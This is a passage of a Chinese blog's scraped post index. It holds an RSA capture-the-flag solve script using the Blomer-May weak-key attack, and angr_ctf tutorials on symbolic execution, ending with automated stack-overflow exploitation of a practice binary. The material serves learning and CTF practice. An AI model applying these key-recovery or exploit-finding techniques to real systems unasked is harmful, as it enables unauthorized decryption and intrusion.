470335762637936005588762180827192207993663594416060284974932410896705386687847439702920143090437462997342000428130417147164245577372958674672171462397851600930104979198327224831772288314005311036009419876584852939180439595289349509330868790367408195151323961061772542485151690708678904080061050887466315542337191307236199_c = 333271281173306446630548720678701979402616631681988817880871964537046235416970583988475783551455814258102380169630603934095599959443467742430556704688855518165068592402751863811686579302153371106333344752494076921552527417915731880831363624299780159503812111855009880750695443491602523883753510968162389168190126033304497'''论文题，可参考：Blomer May Weak Key Revisited123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113from Crypto.Util.number import *from gmpy2 import irootfrom tqdm import tqdmimport itertoolsfrom sympy.ntheory import factorintdef u(d): if d == 1: return 1 factors = factorint(d) primes = list(factors.keys()) index = list(factors.values()) for i in index: if i &gt;= 2: return 0 return pow(-1, len(primes) % 2)def f(d): factors = factorint(d) primes = list(factors.keys()) index = list(factors.values()) base = 1 for i in range(len(primes)): base *= pow(primes[i], index[i]-1) base *= (primes[i] - 1) return basedef combine_check(primes): base = 1 for i in range(len(primes)): base *= (1-f(primes[i])) return basedef rational_to_quotients(x, y): # calculate the series of continued fraction a = x // y quotients = [a] while a * y != x: x, y = y, x - a * y a = x // y quotients.append(a) return quotientsdef convergents_from_quotients(quotients): # calculate the convergent series of continued fraction convergents = [(quotients[0], 1)] for i in range(2, len(quotients) + 1): quotients_partion = quotients[0:i] denom = quotients_partion[-1] # 分母 num = 1 for _ in range(-2, -len(quotients_partion), -1): num, denom = denom, quotients_partion[_] * denom + num num += denom * quotients_partion[0] convergents.append((num, denom)) return convergentsdef Blomer_May_attack(e, n): quotients = rational_to_quotients(e, n) convergents = convergents_from_quotients(quotients) for (_x, _y) in convergents: if _x != 0: T = n + 1 - (e * _y) // _x if T ** 2 - 4 * n &gt; 0: tmp_p = (T + int(iroot(T ** 2 - 4 * n, 2)[0])) // 2 for i in range(-2**5, 2**5): _p = tmp_p + i if n &gt; _p &gt; 1 and n % _p == 0: print('Got solution!') _q = n//_p return _p, _q print('No solution') return Nonedef all_ascii(s): for i in s: if i in range(0x20, 0x7f): continue else: return False return Trueprimes = [6703903964971298549787012499102923063739682910296196688861780721860882015036773488400937149083451713845015929093243025426876941405973284973216824503118559, 6703903964971298549787012499102923063739682910296196688861780721860882015036773488400937149083451713845015929093243025426876941405973284973216824503126443, 6703903964971298549787012499102923063739682910296196688861780721860882015036773488400937149083451713845015929093243025426876941405973284973216824503193349, 6703903964971298549787012499102923063739682910296196688861780721860882015036773488400937149083451713845015929093243025426876941405973284973216824503562289, 6703903964971298549787012499102923063739682910296196688861780721860882015036773488400937149083451713845015929093243025426876941405973284973216824503734189, 6703903964971298549787012499102923063739682910296196688861780721860882015036773488400937149083451713845015929093243025426876941405973284973216824503760301, 6703903964971298549787012499102923063739682910296196688861780721860882015036773488400937149083451713845015929093243025426876941405973284973216824503782813, 6703903964971298549787012499102923063739682910296196688861780721860882015036773488400937149083451713845015929093243025426876941405973284973216824503951191, 6703903964971298549787012499102923063739682910296196688861780721860882015036773488400937149083451713845015929093243025426876941405973284973216824504074953, 6703903964971298549787012499102923063739682910296196688861780721860882015036773488400937149083451713845015929093243025426876941405973284973216824504107911, 6703903964971298549787012499102923063739682910296196688861780721860882015036773488400937149083451713845015929093243025426876941405973284973216824504191461, 6703903964971298549787012499102923063739682910296196688861780721860882015036773488400937149083451713845015929093243025426876941405973284973216824504448729, 6703903964971298549787012499102923063739682910296196688861780721860882015036773488400937149083451713845015929093243025426876941405973284973216824504539989]c = 84010209207136400037674900630630399007540527378939350615722225527845587559010102178617103738600464258190430641037546648203366413208680794400023737381999928100638870193135477985407368386033167118399673001236960699550393986712868487827560601610546135335952667201927052409197291462799539018091792246183307678928298241645258411316936304167124933556606198943248215284393941957893610109127025761289673484220381931928088574316265497075872825588843686573267223321714224535003053507039588501110165036609252972283465620670619170664971316238808580562960566239652372002792893860381585262550998380705474210656337505369024906108022045918104803080765059727578165530772500933465284347893453376016683018177839155666453880461050298815103588796089076127048997409337740340488597725920421812209214132626919132717242722587461710190518049279845280531076833361229586237230905386909567570882397978261647980071794688572393137428928552335623610968045342130104152766075095859252589558838654095036476181115093298573203118822557283958028992348972004110923680696213759378910314691270631431638964147123334674index = [17, 4, 10, 5, 22, 23, 3]_e = 372077403420031165815439199213704344304928202869941592969972103002464355333911024937074871410825817568355544126574173758702600945390438495248751733573391345292294888885607465578329781858741122278411513362633310583564023669185613282939355138576537165757775740881908805743008022348524049466231348651228609449357106436669219_n = 470335762637936005588762180827192207993663594416060284974932410896705386687847439702920143090437462997342000428130417147164245577372958674672171462397851600930104979198327224831772288314005311036009419876584852939180439595289349509330868790367408195151323961061772542485151690708678904080061050887466315542337191307236199_c = 333271281173306446630548720678701979402616631681988817880871964537046235416970583988475783551455814258102380169630603934095599959443467742430556704688855518165068592402751863811686579302153371106333344752494076921552527417915731880831363624299780159503812111855009880750695443491602523883753510968162389168190126033304497_p, _q = Blomer_May_attack(_e, _n)_phi = (_p-1) * (_q-1)_d = inverse(_e, _phi)e = pow(_c, _d, _n)tmp = list(itertools.combinations(primes, 7))for l in tqdm(tmp): phi = 1 for j in l: phi *= j-3 n = -combine_check(l) d = inverse(e, phi) flag = long_to_bytes(pow(c, d, n)) if all_ascii(flag): print(flag) break# 9e519e65a9a492c10f31d4296699f00f","link":"/1cfe8689.html"},{"title":"跟着AngrCTF学Angr(1)","text":"最近想跟着angr_ctf学习了一下符号执行（用来在做逆向的时候偷懒），还是挺有收获的PS:angr == 8.20.1.7二进制文件和脚本存储于https://github.com/ycdxsb/Challenges/tree/master/angr_ctf基本使用#常规使用#00_angr_find01_angr_avoid简单设置目标地址和不想达到的地址即可，可以是单个地址也可以是很多地址，所以这里都用列表统一了一下12345678910111213141516171819202122import angrimport sysdef main(filepath): project = angr.Project(filepath) init_state = project.factory.entry_state() sim = project.factory.simgr(init_state) find = [0x8048678] avoid = [] sim.explore(find=find,avoid=avoid) if sim.found: solution_state = sim.found[0] print(solution_state.posix.dumps(sys.stdin.fileno())) else: raise Exception('Could not find the solution')if __name__==\"__main__\": if(len(sys.argv)!=2): print('usage:python angr_basic.py filepath') filepath = sys.argv[1] main(filepath)设置判断函数#02_angr_find_condition对于一些情况，我们不需要去仔细分析要避免或者搜索哪些分支，只知道正确会输出什么，错误会输出什么，这个时候可以使用判断函数代替之前的地址列表1234567891011121314151617181920212223242526272829import angrimport sysdef main(filepath): project = angr.Project(filepath) init_state = project.factory.entry_state() sim = project.factory.simgr(init_state) def find(state): stdout_output = state.posix.dumps(sys.stdout.fileno()) return b\"Good Job.\" in stdout_output def avoid(state): stdout_output = state.posix.dumps(sys.stdout.fileno()) return b\"Try again.\" in stdout_output sim.explore(find=find,avoid=avoid) if sim.found: solution_state = sim.found[0] print(solution_state.posix.dumps(sys.stdin.fileno())) else: raise Exception('Could not find the solution')if __name__==\"__main__\": if(len(sys.argv)!=2): print('usage:python angr_basic.py filepath') filepath = sys.argv[1] main(filepath)符号化读入#由于angr不能处理复杂的scanf读入情况，因此要自己越过scanf对scanf后的状态赋值，并从scanf后开始执行符号化寄存器#03_angr_symbolic_registers1234567.text:08048882 call _printf.text:08048887 add esp, 10h.text:0804888A call get_user_input.text:0804888F mov [ebp+var_14], eax.text:08048892 mov [ebp+var_10], ebx.text:08048895 mov [ebp+var_C], edx.text:08048898 sub esp, 0Ch可以看到在get_user_input函数执行后，读入的三个数字分别存在eax,ebx和edx中，因此我们越过get_user_input函数开始执行，并且将其中的eax,ebx,edx赋值成angr中的符号即可12345678910111213141516171819202122232425262728293031323334353637383940414243import angrimport sysimport claripydef main(filepath): project = angr.Project(filepath) start_address = 0x804888F init_state = project.factory.blank_state(addr = start_address) password_bits = 32 password0 = claripy.BVS('password0', password_bits) password1 = claripy.BVS('password1', password_bits) password2 = claripy.BVS('password2', password_bits) init_state.regs.eax = password0 init_state.regs.ebx = password1 init_state.regs.edx = password2 sim = project.factory.simgr(init_state) def find(state): stdout_output = state.posix.dumps(sys.stdout.fileno()) return b\"Good Job.\" in stdout_output def avoid(state): stdout_output = state.posix.dumps(sys.stdout.fileno()) return b\"Try again.\" in stdout_output sim.explore(find=find,avoid=avoid) if sim.found: solution_state = sim.found[0] solution0 = format(solution_state.se.eval(password0),'x') solution1 = format(solution_state.se.eval(password1),'x') solution2 = format(solution_state.se.eval(password2),'x') print(solution0,solution1,solution2) else: raise Exception('Could not find the solution')if __name__==\"__main__\": if(len(sys.argv)!=2): print('usage:python angr_basic.py filepath') filepath = sys.argv[1] main(filepath)符号化栈#04_angr_symbolic_stack123456789101112131415int handle_user(){ int result; // eax int v1; // [esp+8h] [ebp-10h] int v2; // [esp+Ch] [ebp-Ch] __isoc99_scanf(\"%u %u\", &amp;v2, &amp;v1); v2 = complex_function0(v2); v1 = complex_function1(v1); if ( v2 == 887024739 &amp;&amp; v1 == 1261126168 ) result = puts(\"Good Job.\"); else result = puts(\"Try again.\"); return result;}可以看到，以%u格式读入后的数据v1和v2存储在栈上，那么当我们越过scanf开始执行时，不仅要构造符号向量，也要模拟函数执行前的栈。12345678910111213141516171819202122232425262728293031323334353637383940414243import angrimport sysimport claripydef main(filepath): project = angr.Project(filepath) start_address = 0x8048697 init_state = project.factory.blank_state(addr=start_address) init_state.regs.ebp = init_state.regs.esp init_state.regs.esp -= 8 password0 = claripy.BVS('password0', 32) password1 = claripy.BVS('password1', 32) init_state.stack_push(password0) init_state.stack_push(password1) sim = project.factory.simgr(init_state) def find(state): stdout_output = state.posix.dumps(sys.stdout.fileno()) return b\"Good Job.\" in stdout_output def avoid(state): stdout_output = state.posix.dumps(sys.stdout.fileno()) return b\"Try again.\" in stdout_output sim.explore(find=find, avoid=avoid) if sim.found: solution_state = sim.found[0] solution0 = solution_state.se.eval(password0) solution1 = solution_state.se.eval(password1) print(solution0, solution1) else: raise Exception('Could not find the solution')if __name__ == \"__main__\": if(len(sys.argv) != 2): print('usage:python angr_basic.py filepath') filepath = sys.argv[1] main(filepath)符号化bss#05_angr_symbolic_memory123456789101112131415int __cdecl main(int argc, const char **argv, const char **envp){ int i; // [esp+Ch] [ebp-Ch] memset(user_input, 0, 0x21u); printf(\"Enter the password: \"); __isoc99_scanf(\"%8s %8s %8s %8s\", user_input, &amp;unk_B368DA8, &amp;unk_B368DB0, &amp;unk_B368DB8); for ( i = 0; i &lt;= 31; ++i ) *(_BYTE *)(i + 0xB368DA0) = complex_function(*(char *)(i + 0xB368DA0), i); if ( !strncmp(user_input, \"IIZAUPRCZIZQJGKOJGDEAPHFFOBMNITD\", 0x20u) ) puts(\"Good Job.\"); else puts(\"Try again.\"); return 0;}可以看到是以字符串形式读入四个8字节的字符串，然后存到bss段上，所以越过scanf，并且在bss段上赋上符号数据即可123456789101112131415161718192021222324252627282930313233343536373839404142import angrimport sysimport claripydef main(filepath): project = angr.Project(filepath) start_address = 0x8048601 init_state = project.factory.blank_state(addr=start_address) passwords = [claripy.BVS(\"password%d\" % i, 64) for i in range(4)] passwords_address = [0xB368DA0, 0xB368DA8, 0xB368DB0, 0xB368DB8] for i in range(4): init_state.memory.store(passwords_address[i], passwords[i]) sim = project.factory.simgr(init_state) def find(state): stdout_output = state.posix.dumps(sys.stdout.fileno()) return b\"Good Job.\" in stdout_output def avoid(state): stdout_output = state.posix.dumps(sys.stdout.fileno()) return b\"Try again.\" in stdout_output sim.explore(find=find, avoid=avoid) if sim.found: solution_state = sim.found[0] solutions = [] for i in range(4): solutions.append(solution_state.se.eval( passwords[i], cast_to = bytes)) print(b\" \".join(solutions)) else: raise Exception('Could not find the solution')if __name__ == \"__main__\": if(len(sys.argv) != 2): print('usage:python angr_basic.py filepath') filepath = sys.argv[1] main(filepath)符号化堆#06_angr_symbolic_dynamic_memory12345678910111213int __cdecl main(int argc, const char **argv, const char **envp){ char *v3; // ebx char *v4; // ebx int v6; // [esp-10h] [ebp-1Ch] signed int i; // [esp+0h] [ebp-Ch] buffer0 = (char *)malloc(9u); buffer1 = (char *)malloc(9u); memset(buffer0, 0, 9u); memset(buffer1, 0, 9u); printf(\"Enter the password: \"); __isoc99_scanf(\"%8s %8s\", buffer0, buffer1, v6);在这里，buffer0和buffer1是.bss段的指针，在运行过程中申请了内存块，scanf读入的数据也是存在申请的内存块内的，所以需要自己符号化malloc的内存1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950import angrimport sysimport claripydef main(filepath): project = angr.Project(filepath) start_address = 0x8048699 init_state = project.factory.blank_state(addr=start_address) password0 = claripy.BVS('password0',64) password1 = claripy.BVS('password1',64) fake_heap_address0 = 0xffffc93c fake_heap_address1 = 0xffffc94c pointer_to_malloc_memory_address0 = 0x8135468 pointer_to_malloc_memory_address1 = 0x8135470 init_state.memory.store(pointer_to_malloc_memory_address0,fake_heap_address0,endness=project.arch.memory_endness) init_state.memory.store(pointer_to_malloc_memory_address1,fake_heap_address1,endness=project.arch.memory_endness) init_state.memory.store(fake_heap_address0,password0) init_state.memory.store(fake_heap_address1,password1) sim = project.factory.simgr(init_state) def find(state): stdout_output = state.posix.dumps(sys.stdout.fileno()) return b\"Good Job.\" in stdout_output def avoid(state): stdout_output = state.posix.dumps(sys.stdout.fileno()) return b\"Try again.\" in stdout_output sim.explore(find=find, avoid=avoid) if sim.found: solution_state = sim.found[0] sulution0=solution_state.se.eval(password0,cast_to=bytes) sulution1=solution_state.se.eval(password1,cast_to=bytes) print(b\" \".join([sulution0,sulution1])) else: raise Exception('Could not find the solution')if __name__ == \"__main__\": if(len(sys.argv) != 2): print('usage:python angr_basic.py filepath') filepath = sys.argv[1] main(filepath)符号化文件#07_angr_symbolic_file1234567891011121314151617181920212223int __cdecl __noreturn main(int argc, const char **argv, const char **envp){ signed int i; // [esp+Ch] [ebp-Ch] memset(buffer, 0, 0x40u); printf(\"Enter the password: \"); __isoc99_scanf(\"%64s\", buffer); ignore_me((int)buffer, 0x40u); memset(buffer, 0, 0x40u); fp = fopen(\"JKOYZJZV.txt\", \"rb\"); fread(buffer, 1u, 0x40u, fp); fclose(fp); unlink(\"JKOYZJZV.txt\"); for ( i = 0; i &lt;= 7; ++i ) *(_BYTE *)(i + 134520992) = complex_function(*(char *)(i + 0x804A0A0), i); if ( strncmp(buffer, \"QAIIDABN\", 9u) ) { puts(\"Try again.\"); exit(1); } puts(\"Good Job.\"); exit(0);}可以看到这里需要从文件读取内容，所以需要自己符号化文件123456789101112131415161718192021222324252627282930313233343536373839404142434445import angrimport sysimport claripydef main(filepath): project = angr.Project(filepath) start_address = 0x80488D6 init_state = project.factory.blank_state(addr=start_address) filename = \"JKOYZJZV.txt\" symbolic_file_size_bytes = 0x40 password = claripy.BVS('password', symbolic_file_size_bytes * 8) #file_options = 'r' password_file = angr.storage.SimFile(filename, content=password,size = symbolic_file_size_bytes) init_state.fs.insert(filename,password_file) sim = project.factory.simgr(init_state) def find(state): stdout_output = state.posix.dumps(sys.stdout.fileno()) return b\"Good Job.\" in stdout_output def avoid(state): stdout_output = state.posix.dumps(sys.stdout.fileno()) return b\"Try again.\" in stdout_output sim.explore(find=find, avoid=avoid) if sim.found: solution_state = sim.found[0] solution = solution_state.se.eval(password,cast_to=bytes) print(solution) else: raise Exception('Could not find the solution')if __name__ == \"__main__\": if(len(sys.argv) != 2): print('usage:python angr_basic.py filepath') filepath = sys.argv[1] main(filepath)","link":"/c5d1d51e.html"},{"title":"跟着AngrCTF学Angr(2)","text":"第二部分主要是hook相关的内容的学习PS:angr == 8.20.1.7二进制文件和脚本存储于https://github.com/ycdxsb/Challenges/tree/master/angr_ctf添加条件约束#08_angr_constraints12345678910111213_BOOL4 __cdecl check_equals_DQCSFFYXVUJIKEBQ(int a1, unsigned int a2){ int v3; // [esp+8h] [ebp-8h] unsigned int i; // [esp+Ch] [ebp-4h] v3 = 0; for ( i = 0; i &lt; a2; ++i ) { if ( *(_BYTE *)(i + a1) == *(_BYTE *)(i + 134520896) ) ++v3; } return v3 == a2;}由于符号执行存在路径爆炸问题，在一些情况下，会出现路径爆炸的问题，比如上面的示例中，本来字符串一起比较即可，但由于实现中单字节比较，就会出现2的16次方的分支，因此选择自己添加条件约束是十分明智的。1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950import angrimport sysimport claripydef main(filepath): project = angr.Project(filepath) start_address = 0x8048625 init_state = project.factory.blank_state(addr=start_address) password = claripy.BVS('password', 0x10*8) password_addr = 0x804A050 init_state.memory.store(password_addr, password) sim = project.factory.simgr(init_state) def find(state): stdout_output = state.posix.dumps(sys.stdout.fileno()) return b\"Good Job.\" in stdout_output def avoid(state): stdout_output = state.posix.dumps(sys.stdout.fileno()) return b\"Try again.\" in stdout_output sim.explore(find=0x804866C) if sim.found: solution_state = sim.found[0] constrained_parameter_address = 0x804A050 constrained_parameter_size_bytes = 0x10 constrained_parameter_bitvector = solution_state.memory.load( constrained_parameter_address, constrained_parameter_size_bytes ) constrained_parameter_desired_value = \"DQCSFFYXVUJIKEBQ\" constraint_expression = constrained_parameter_bitvector == constrained_parameter_desired_value solution_state.add_constraints( constrained_parameter_bitvector == constrained_parameter_desired_value) solution = solution_state.se.eval( password, cast_to=bytes) # 求解得到满足上述条件的输入 print(solution) else: raise Exception('Could not find the solution')if __name__ == \"__main__\": if(len(sys.argv) != 2): print('usage:python angr_basic.py filepath') filepath = sys.argv[1] main(filepath)简单Hook#09_angr_hooks123456789101112131415161718192021222324int __cdecl main(int argc, const char **argv, const char **envp){ _BOOL4 v3; // eax signed int i; // [esp+8h] [ebp-10h] signed int j; // [esp+Ch] [ebp-Ch] qmemcpy(password, \"JRZSQFKOVMSDNCWS\", 16); memset(buffer, 0, 0x11u); printf(\"Enter the password: \"); __isoc99_scanf(\"%16s\", buffer); for ( i = 0; i &lt;= 15; ++i ) *(_BYTE *)(i + 0x804A054) = complex_function(*(char *)(i + 0x804A054), 18 - i); equals = check_equals_JRZSQFKOVMSDNCWS((int)buffer, 0x10u); for ( j = 0; j &lt;= 15; ++j ) *(_BYTE *)(j + 0x804A044) = complex_function(*(char *)(j + 0x804A044), j + 9); __isoc99_scanf(\"%16s\", buffer); v3 = equals &amp;&amp; !strncmp(buffer, password, 0x10u); equals = v3; if ( v3 ) puts(\"Good Job.\"); else puts(\"Try again.\"); return 0;}同样是为了解决路径爆炸问题，但由于后续还有其他操作，所以我们在这里需要hook掉比较函数，然后继续向下执行1234567891011121314151617181920212223242526272829303132333435363738394041424344454647import angrimport claripyimport sysdef main(filepath): project = angr.Project(filepath) init_state = project.factory.entry_state() sim = project.factory.simgr(init_state) check_equals_called_address = 0x80486B3 instruction_to_skip_length = 5 @project.hook(check_equals_called_address, length=instruction_to_skip_length) def skip_check_equals_(state): user_input_buffer_address = 0x804A054 user_input_buffer_length = 0x10 user_input_string = state.memory.load( user_input_buffer_address, user_input_buffer_length) check_against_string = \"JRZSQFKOVMSDNCWS\" state.regs.eax = claripy.If( user_input_string == check_against_string, claripy.BVV(1, 32), claripy.BVV(0, 32)) simulation = project.factory.simgr(init_state) def find(state): stdout_output = state.posix.dumps(sys.stdout.fileno()) return b\"Good Job.\" in stdout_output def avoid(state): stdout_output = state.posix.dumps(sys.stdout.fileno()) return b\"Try again.\" in stdout_output simulation.explore(find=find, avoid=avoid) if simulation.found: solution_state = simulation.found[0] print(solution_state.posix.dumps(sys.stdin.fileno())) else: raise Exception('Could not find the solution')if __name__ == '__main__': if(len(sys.argv) != 2): print('usage:python angr_basic.py filepath') filepath = sys.argv[1] main(filepath)Hook时，首先要确定位置和hook掉函数占用的指令数，然后自己实现hook的函数，需要注意的是，返回值在eax寄存器中，需要进行符号化处理进阶Hook#10_angr_simprocedures12345678910111213141516171819int __cdecl main(int argc, const char **argv, const char **envp){ signed int i; // [esp+20h] [ebp-28h] char s[17]; // [esp+2Bh] [ebp-1Dh] unsigned int v6; // [esp+3Ch] [ebp-Ch] v6 = __readgsdword(0x14u); memcpy(&amp;password, \"JWRJJJAJTWHCQHPZ\", 0x10u); memset(s, 0, 0x11u); printf(\"Enter the password: \"); __isoc99_scanf(\"%16s\", s); for ( i = 0; i &lt;= 15; ++i ) s[i] = complex_function(s[i], 18 - i); if ( check_equals_JWRJJJAJTWHCQHPZ((int)s, 0x10u) ) puts(\"Good Job.\"); else puts(\"Try again.\"); return 0;}在一些时候，如果需要Hook的函数存在于多个地方，我们不可能一个一个的去Hook，所以按函数的符号名Hook是比较科学的方法，虽然示例中只出现了一次，但这次我们通过函数符号进行Hook12345678910111213141516171819202122232425262728293031323334353637383940414243import angrimport claripyimport sysdef main(filepath): project = angr.Project(filepath) init_state = project.factory.entry_state() sim = project.factory.simgr(init_state) class ReplacementCheckEquals(angr.SimProcedure): def run(self,data_addr,length): user_input_string = self.state.memory.load(data_addr,length) check_against_string = \"JWRJJJAJTWHCQHPZ\" return claripy.If(user_input_string==check_against_string,claripy.BVV(1,32),claripy.BVV(0,32)) check_equals_symbol = \"check_equals_JWRJJJAJTWHCQHPZ\" project.hook_symbol(check_equals_symbol,ReplacementCheckEquals()) simulation = project.factory.simgr(init_state) def find(state): stdout_output = state.posix.dumps(sys.stdout.fileno()) return b\"Good Job.\" in stdout_output def avoid(state): stdout_output = state.posix.dumps(sys.stdout.fileno()) return b\"Try again.\" in stdout_output simulation.explore(find=find, avoid=avoid) if simulation.found: solution_state = simulation.found[0] print(solution_state.posix.dumps(sys.stdin.fileno())) else: raise Exception('Could not find the solution')if __name__ == '__main__': if(len(sys.argv) != 2): print('usage:python angr_basic.py filepath') filepath = sys.argv[1] main(filepath)Hook scanf函数#11_angr_sim_scanf1234567891011121314151617181920212223cint __cdecl main(int argc, const char **argv, const char **envp){ _BOOL4 v3; // eax signed int i; // [esp+20h] [ebp-28h] char s[4]; // [esp+28h] [ebp-20h] int v7; // [esp+2Ch] [ebp-1Ch] unsigned int v8; // [esp+3Ch] [ebp-Ch] v8 = __readgsdword(0x14u); memset(s, 0, 0x14u); *(_DWORD *)s = 1329940303; v7 = 1179340618; for ( i = 0; i &lt;= 7; ++i ) s[i] = complex_function(s[i], i); printf(\"Enter the password: \"); __isoc99_scanf(\"%u %u\", buffer0, buffer1); v3 = !strncmp(buffer0, s, 4u) &amp;&amp; !strncmp(buffer1, (const char *)&amp;v7, 4u); if ( v3 ) puts(\"Good Job.\"); else puts(\"Try again.\"); return 0;}和前面很像，但这次需要hook我们最常用的scanf函数123456789101112131415161718192021222324252627282930313233343536373839404142434445464748import angrimport claripyimport sysdef main(filepath): project = angr.Project(filepath) init_state = project.factory.entry_state() sim = project.factory.simgr(init_state) class ReplacementScanf(angr.SimProcedure): def run(self,format_string,buffer0_addr,buffer1_addr): buffer0 = claripy.BVS('buffer0',4*8) buffer1 = claripy.BVS('buffer1',4*8) self.state.memory.store(buffer0_addr,buffer0,endness=project.arch.memory_endness) self.state.memory.store(buffer1_addr,buffer1,endness=project.arch.memory_endness) self.state.globals['solution0'] = buffer0 self.state.globals['solution1'] = buffer1 scanf_symbol = \"__isoc99_scanf\" project.hook_symbol(scanf_symbol,ReplacementScanf()) simulation = project.factory.simgr(init_state) def find(state): stdout_output = state.posix.dumps(sys.stdout.fileno()) return b\"Good Job.\" in stdout_output def avoid(state): stdout_output = state.posix.dumps(sys.stdout.fileno()) return b\"Try again.\" in stdout_output simulation.explore(find=find, avoid=avoid) if simulation.found: solution_state = simulation.found[0] solution0 = solution_state.se.eval(solution_state.globals['solution0']) solution1 = solution_state.se.eval(solution_state.globals['solution1']) print(solution0,solution1) else: raise Exception('Could not find the solution')if __name__ == '__main__': if(len(sys.argv) != 2): print('usage:python angr_basic.py filepath') filepath = sys.argv[1] main(filepath)需要将符号数据存入buffer0和buffer1中，同时由于变量在对象内声明并且最后需要在对象外使用，因此通过state类的globals实现存取Veritesting模式#12_angr_veritestingveritesting是一个符号执行的选项，使用路径融合来解决路径爆炸的问题，例如前面一个字符一个字符比较的情况1234567891011121314151617181920212223242526272829import angrimport sysdef main(filepath): project = angr.Project(filepath) init_state = project.factory.entry_state() sim = project.factory.simgr(init_state,veritesting=True) def find(state): stdout_output = state.posix.dumps(sys.stdout.fileno()) return b\"Good Job.\" in stdout_output def avoid(state): stdout_output = state.posix.dumps(sys.stdout.fileno()) return b\"Try again.\" in stdout_output sim.explore(find=find,avoid=avoid) if sim.found: solution_state = sim.found[0] print(solution_state.posix.dumps(sys.stdin.fileno())) else: raise Exception('Could not find the solution')if __name__==\"__main__\": if(len(sys.argv)!=2): print('usage:python angr_basic.py filepath') filepath = sys.argv[1] main(filepath)在静态编译的二进制中进行Hook#13_angr_static_binary在符号执行时，遇到一些libc中的函数，angr其实都会帮我们hook掉，不然会影响符号执行的速度。所以这里通过实例让我们自己试试使用angr的功能Hook一下，angr已经实现的hook如下：https://github.com/angr/angr/tree/master/angr/procedures/libc1234567891011121314151617181920212223242526272829303132import angrimport sysdef main(filepath): project = angr.Project(filepath) init_state = project.factory.entry_state() sim = project.factory.simgr(init_state,veritesting=True) project.hook(0x804EF40,angr.SIM_PROCEDURES['libc']['printf']()) project.hook(0x804EF80,angr.SIM_PROCEDURES['libc']['scanf']()) project.hook(0x804F550,angr.SIM_PROCEDURES['libc']['puts']()) project.hook(0x80491F0,angr.SIM_PROCEDURES['glibc']['__libc_start_main']()) def find(state): stdout_output = state.posix.dumps(sys.stdout.fileno()) return b\"Good Job.\" in stdout_output def avoid(state): stdout_output = state.posix.dumps(sys.stdout.fileno()) return b\"Try again.\" in stdout_output sim.explore(find=find,avoid=avoid) if sim.found: solution_state = sim.found[0] print(solution_state.posix.dumps(sys.stdin.fileno())) else: raise Exception('Could not find the solution')if __name__==\"__main__\": if(len(sys.argv)!=2): print('usage:python angr_basic.py filepath') filepath = sys.argv[1] main(filepath)Hook自定义的动态链接库#14_angr_shared_library这里需要我们Hook自定义的动态链接库中的函数，这里不需要我们去执行这个二进制文件，而是直接通过angr对动态库lib14_angr_shared_library.so中的validate函数进行符号执行。12345678910111213141516171819202122232425262728293031323334353637383940414243444546import angrimport sysimport claripydef main(filepath): base = 0x400000 validate_addr_offset = 0x6D7 project = angr.Project(filepath, load_options={ 'main_opts': { 'custom_base_addr': base } }) password_addr = claripy.BVV(0xffffff00, 32) # pointer validate_addr = base + validate_addr_offset init_state = project.factory.call_state( validate_addr, password_addr, claripy.BVV(8, 32)) password = claripy.BVS(\"password\", 8*8) init_state.memory.store(password_addr, password) sim = project.factory.simgr(init_state) success_addr = base+0x783 def find(state): stdout_output = state.posix.dumps(sys.stdout.fileno()) return b\"Good Job.\" in stdout_output def avoid(state): stdout_output = state.posix.dumps(sys.stdout.fileno()) return b\"Try again.\" in stdout_output sim.explore(find=success_addr) if sim.found: solution_state = sim.found[0] solution_state.add_constraints(solution_state.regs.eax != 0) solution = solution_state.se.eval(password,cast_to = bytes) print(solution) else: raise Exception('Could not find the solution')if __name__ == \"__main__\": if(len(sys.argv) != 2): print('usage:python angr_basic.py filepath') filepath = sys.argv[1] main(filepath)之前的hook我们都知道函数的地址，而在动态库中，我们没法直接知道地址，所以需要制定base，并传入参数调用函数。由于只对这个函数进行符号执行，所以也要加入符号执行正确时的约束。","link":"/eefc86dd.html"},{"title":"跟着AngrCTF学Angr(3)","text":"第三部分是一些漏洞自动化利用相关的内容PS:angr == 8.20.1.7二进制文件和脚本存储于https://github.com/ycdxsb/Challenges/tree/master/angr_ctf栈溢出利用——任意读#15_angr_arbitrary_read12345678910111213141516171819202122int __cdecl main(int argc, const char **argv, const char **envp){ char v4; // [esp+Ch] [ebp-1Ch] char *s; // [esp+1Ch] [ebp-Ch] s = try_again; printf(\"Enter the password: \"); __isoc99_scanf(\"%u %20s\", &amp;key, &amp;v4); if ( key == 0xBA9057 ) { puts(try_again); } else if ( key == 0x1B2DDE3 ) { puts(s); } else { puts(try_again); } return 0;}能够看到存在简单的溢出，v4长度为0x10，但由于读入20个字符，因此能够覆盖掉s的内容题目的目的是为了让我们使用angr，自动化的对溢出进行利用，覆盖s的内容为&quot;Good Job&quot;地址，从而修改程序输出为&quot;Good Job&quot;1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071import angrimport sysimport claripydef main(filepath): project = angr.Project(filepath) init_state = project.factory.entry_state() class ReplacementScanf(angr.SimProcedure): def run(self, format_string, key_address, input_address): scanf0 = claripy.BVS('scanf0', 4*8) scanf1 = claripy.BVS('scanf1', 20*8) for chr in scanf1.chop(bits=8): # 32&lt;=ch&lt;=127 self.state.add_constraints(chr &gt;= '0', chr &lt;= 'z') self.state.memory.store( key_address, scanf0, endness=project.arch.memory_endness) self.state.memory.store( input_address, scanf1, endness=project.arch.memory_endness) self.state.globals['solution0'] = scanf0 self.state.globals['solution1'] = scanf1 scanf_symbol = '__isoc99_scanf' project.hook_symbol(scanf_symbol, ReplacementScanf()) def check_puts(state): # 检查puts函数参数是否为’Good Job‘地址 puts_parameter = state.memory.load( state.regs.esp+4, 4, endness=project.arch.memory_endness) # 在进入puts时检查，由于参数调用的约定，此时esp+4开始的4个字节为puts参数 if(state.solver.symbolic(puts_parameter)): good_job_address = 0x50514957 is_vulnerable_expression = puts_parameter == good_job_address copied_state=state.copy() copied_state.add_constraints(is_vulnerable_expression) if(copied_state.satisfiable()): state.add_constraints(is_vulnerable_expression) return True else: return False else: return False def is_successful(state): puts_address = 0x8048370 if(state.addr == puts_address): return check_puts(state) else: return False sim = project.factory.simgr(init_state) sim.explore(find=is_successful) if sim.found: solution_state = sim.found[0] solution0 = solution_state.solver.eval(solution_state.globals['solution0'],cast_to=int) solution1 = solution_state.solver.eval(solution_state.globals['solution1'], cast_to=bytes) print(solution0,solution1[::-1]) else: raise Exception('Could not find the solution')if __name__ == 